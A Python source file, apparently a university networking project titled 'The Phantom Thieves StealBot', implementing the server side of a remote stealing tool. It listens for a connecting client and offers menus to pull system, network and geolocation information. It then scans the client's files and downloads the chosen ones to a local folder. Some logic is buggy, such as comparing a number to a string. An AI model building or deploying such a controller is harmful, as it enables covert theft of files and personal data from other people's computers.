#  Progetto Reti - The Phantom Thieves of Hearts (Take your time)
#
#
#
#
#                                                                     ,,,,,,,,,,,
#                                                              ,,,,,,,,,,,,
#                                                         ,,,,,,,,,,,,, ,,,   ,
#                                                    ,,,,,,,,,,,,,,, ,, ,,,    ,
#                                                 ,,,,,,,,,,,,,,,,,,,,, ,,,, , ,
#                                              ,,,,,,,,,,,,,,,,,,,,,,,,, ,,,   ,.
#                                             ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,
#                                           ,,,,,,,,,,,,,   ,,,,,,,,,,,,, ,,,,  ,
#                                           ,,,,,,,,,         ,,,,,,,,,,,, ,,,  ,,
#                                                            , ,,,,,,,,,,,,.,,,  ,
#                                                             ,,,,,,,,,,,,,,,,,, ,,                        @
#                                                               , ,,,,,,,,,,,,,,           ,
#                                                                , ,,,,,,,,,,, ,      ,,                      @@
#                                                                   ,,,,,,,,,,  ,, ,,        @@       ,     @
#                                                                    ,,,,,,, ,,,,,,      &@@   ,,,,,,,,   @@
#                                                                      ,, ,,,,,,,      @@@@ ,,,, @ ,,,  @@@
#                                                                     ,,,,,,, ,      @@@@@@,,,,@@ ,,,@@@@@
#                                                                 ,,,,,,,,,, ,    ,, @@@@@@@,, @@@@@@@@@(
#                                                                  ,,,,,,,,,,  @,,,,,@@@@@@@@ ,,,,,
#                                                                   ,,,,,,,,  @ ,,,,&@@@@@@ ,,,,,,,
#                                                       ,,,,,,       ,,,, ,  @@@@ @@@@@@@@@ ,, ,,,
#                                                  ,,,,,,,,,,,,       , ,,, @@@@@@@@@@@@@@@@@ ,,,
#                                                ,,,,,,,,,,,,,,,,      , , @@@@@@@@@@@@@@@  ,,,
#                                               ,,,,,,,,,,,,,,,,,,,,,,, ,,,,@@@@@@@@@ ,,,,,,,,
#                                                ,,,,,,,,,,,,,,,,,,,,  ,,,.@@@@@@@@@    @ ,,
#                                                   ,,,,,,,,, ,,,    ,,,,,@@@@@.@@@@@@, ,,
#                                                              @@@@   .,,, ,,,,,,,,,,,,,
#                                                                 @@   ,,,,,,,,,,,,,,,
#
#
#
#
#  Autori:
#  ALEX CIACCIARELLA    N86003179
#  STEFANO DE FENZA    N86003446
#  ELVINO BUONANNO      N86003302
#  GUGLIELMO DE BIASIO     N86003216
#
import json
# default imports
import logging
import os
import signal
import socket
import time


# downloaded imports
import pyfiglet


# attributi globali
Port = 9091
IpAddr = "192.168.1.154"
s = socket.socket()
access_token = '0ffd6eb3150512'

def cosaFare():
    print("Cosa vuoi fare ora?")
    print("1)Ottieni Informazioni complete sul sistema sul sistema")
    print("2)Cerca File nel sistema")
    print("3)Chiudi la connessione")


def MenuClient():
    print("What do you want to do?")
    print("1)Get All Information about the system")
    print("2)Get Cpu Information")
    print("3)Get Ram Information")
    print("4)Get current Disk Information")
    print("5)Get Network Information")
    print("6)Get Geolocalization Information")
    print("7)Scan Files on client pc")

    resp = ''
    try:
        resp = int(input())
    except ValueError:
        print("Inserisci un numero valido")
    if 0 < resp < 8:
        return resp
    else:
        print("Inserisci un numero valido")



def cosaFareInizialmente(client) -> bool:
    response = MenuClient()
    if response == '7':
        #far partire le funzioni di scan file
        chosen_path = scanPaths(client)
        client.send(chosen_path)
        found_files, files_by_number = downloadMenu(client)
        client.send(found_files)
        pass
    else:
        #inviare normalmente le richieste
        OttieniInformazioni(client, response)

    if CloseConnection():
        client.close()
        return False
    else:
        return True

def OttieniInformazioni(client, res):
    #res = MenuClient()

    #print(res)

    client.send(str(res).encode())
    print("Message Sent!")


    message = client.recv(8192).decode()
    print("Message received!")
    print(message)

    time.sleep(1)  # riga finale prima dell'ultima operazione



def CloseConnection():
    print("Do you Want To close the connection?")
    print("1)Yes")
    print("2)No")

    response = input()
    if response == "2":
        return False
    elif response == "1":
        return True
    else:
        return CloseConnection()




def CreaSocket():
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Socket Successfully created")
    except socket.error as e:
        s.close()
        logging.error(e)


def CreaBind():
    global s
    try:
        s.bind((IpAddr, Port))
        print("Bind Creato")
    except socket.error as e:
        s.close()
        logging.error(e)


def Listen():
    global s
    try:
        print("Now in listening...")
        s.listen(5)
        client, address = s.accept()
        print(f"Connessione accettata con {client.getpeername()}")
        client.send(str(access_token).encode())
        return client, address
    except Exception as e:
        print("Errore nel listen")
        s.close()
        logging.error(e)


def ConnectionMenu() -> bool:
    print("Do you want to accept other connections?")
    print("1)Yes")
    print("2)No")
    risposta = input()
    if risposta == '1':
        return False
    elif risposta == '2':
        return True
    else:
        return ConnectionMenu()


def main():
    esisteclient = False
    connessioneclient = True

    CreaSocket()
    CreaBind()


    while not esisteclient:
        client, _ = Listen()
        #client trovato
        while connessioneclient:
            connessioneclient = cosaFareInizialmente(client)

        esisteclient = ConnectionMenu()
    s.close()


def scanPaths(client_object):
    path_dict = client_object.recv(1092).decode()
    print("Scegliere quale dei seguenti percorsi scannerizzare:")
    print(path_dict)
    choice = int(input())
    lines = {}
    path_dict = path_dict.replace('{', '')
    path_dict = path_dict.replace('}', '')
    index = 1
    for i in path_dict.splitlines():
        if i != '':
            mod_string = i[3:-1]
            mod_string = mod_string.split(f'"{index})')
            result = '"'.join(mod_string)
            result = result.split(":")
            result[0] = result[0].replace('"','')
            result[1] = result[1].replace('"','')
            lines[str(result[0])] = str(result[1])
            index += 1

    path = list(lines.values())[choice-1]

    return bytes(path)


def calculate_range_number(start: int, end: int, list: list):
    for i in range(start, end+1):
        if not i in list:
            list.append(i)


def is_str_correct(str):
    if str[len(str)-1] == "-" or str[len(str)-1] == ",":
        return False

    for i in range(0, len(str)):
        if i == len(str)-1 and (str[i] != ',' or str[i] != '-'):
            return True
        if(str[i] == str[i+1] and (str[i] == ',' or str[i] == '-')):
            return False
        if(str[i] == ',' and str[i+1] == "-"):
            return False
    return False

def filteredList(rawList):
    single_file_index = []
    if is_str_correct(rawList):
        first_split_str = rawList.split(",")

        for i in first_split_str:
            if not '-' in i:
                if not int(i) in single_file_index:
                    single_file_index.append(int(i))
            else:
                range = i.split('-')
                calculate_range_number(int(range[0]), int(range[len(range) - 1]), single_file_index)
        return single_file_index
    else:
        print("La stringa non è valida")


def downloadMenu(client_object):
    choice = 0

    found_files = client_object.recv(8192).decode()
    found_files = json.loads(found_files)
    found_files_number = []
    counter = 1
    index = 0
    for i in found_files:
        found_files_number.insert(index,f"{counter}) {found_files[index]}")
        counter += 1
        index += 1



    print("File trovati:\n")
    print(found_files_number)

    print("\nVuoi scaricare qualcosa? \n1) Sì\n2) No")

    choice = int(input())

    if choice == 1:
        print("Indicare con i numeri quali file scaricare. "
              "Per scaricare file consecutivamente scrivere '1-10' mentre per più file specifici, separarli con la virgola '1,3,5'.\n")
        choice2 = input()
        file_list = filteredList(choice2)

        return json.dumps(found_files,indent=4).encode("utf-8"),json.dumps(file_list).encode("utf-8")
    else:
        s.close()
        exit(1)

def downloaderFunction(client_object):
    number_of_files = client_object.recv(1092).decode("utf-8")
    number_of_files = int(number_of_files)
    for i in range(0,number_of_files):
        file_name = client_object.recv(1092).decode("utf-8","ignore")
        file_name = file_name[file_name.rfind('/') + 1:len(file_name)]
        client_object.send("ho ricevuto il file-name".encode("utf-8"))
        path = "./downloaded_files"
        if not os.path.exists(path):
            os.mkdir(path=path)

        with open(os.path.join(path,file_name), 'wb') as file_to_write:
            print(f"Sto scaricando il file: {file_name}, devo scaricare ancora: {number_of_files - i} files")
            data = recvall(client_object)
            file_to_write.write(data)

        client_object.send("Ho finito di scaricare, manda altro".encode("utf-8"))


def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data


def signal_handler(signal, frame):
    print("Keyboard Interrupt received: closing connection...")
    s.close()
    exit(0)

def groupText():
    print(pyfiglet.figlet_format("The Phantom Thieves StealBot"))

def Phantom():
    print("""                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                   ,,,,,,,,,,,                                                                        
                                                            ,,,,,,,,,,,,                                                                              
                                                       ,,,,,,,,,,,,, ,,,   ,                                                                          
                                                  ,,,,,,,,,,,,,,, ,, ,,,    ,                                                                         
                                               ,,,,,,,,,,,,,,,,,,,,, ,,,, , ,                                                                         
                                            ,,,,,,,,,,,,,,,,,,,,,,,,, ,,,   ,.                                                                        
                                           ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,                                                                        
                                         ,,,,,,,,,,,,,   ,,,,,,,,,,,,, ,,,,  ,                                                                        
                                         ,,,,,,,,,         ,,,,,,,,,,,, ,,,  ,,                                                                       
                                                          , ,,,,,,,,,,,,.,,,  ,                                                                       
                                                           ,,,,,,,,,,,,,,,,,, ,,                        @                                             
                                                             , ,,,,,,,,,,,,,,           ,                                                             
                                                              , ,,,,,,,,,,, ,      ,,                      @@                                         
                                                                 ,,,,,,,,,,  ,, ,,        @@       ,     @                                            
                                                                  ,,,,,,, ,,,,,,      &@@   ,,,,,,,,   @@                                             
                                                                    ,, ,,,,,,,      @@@@ ,,,, @ ,,,  @@@                                              
                                                                   ,,,,,,, ,      @@@@@@,,,,@@ ,,,@@@@@                                               
                                                               ,,,,,,,,,, ,    ,, @@@@@@@,, @@@@@@@@@(                                                
                                                                ,,,,,,,,,,  @,,,,,@@@@@@@@ ,,,,,                                                      
                                                                 ,,,,,,,,  @ ,,,,&@@@@@@ ,,,,,,,                                                      
                                                     ,,,,,,       ,,,, ,  @@@@ @@@@@@@@@ ,, ,,,                                                       
                                                ,,,,,,,,,,,,       , ,,, @@@@@@@@@@@@@@@@@ ,,,                                                        
                                              ,,,,,,,,,,,,,,,,      , , @@@@@@@@@@@@@@@  ,,,                                                          
                                             ,,,,,,,,,,,,,,,,,,,,,,, ,,,,@@@@@@@@@ ,,,,,,,,                                                           
                                              ,,,,,,,,,,,,,,,,,,,,  ,,,.@@@@@@@@@    @ ,,                                                             
                                                 ,,,,,,,,, ,,,    ,,,,,@@@@@.@@@@@@, ,,                                                               
                                                            @@@@   .,,, ,,,,,,,,,,,,,                                                                 
                                                               @@   ,,,,,,,,,,,,,,,                                                                   
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      """)
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    groupText()
    Phantom()
    main()
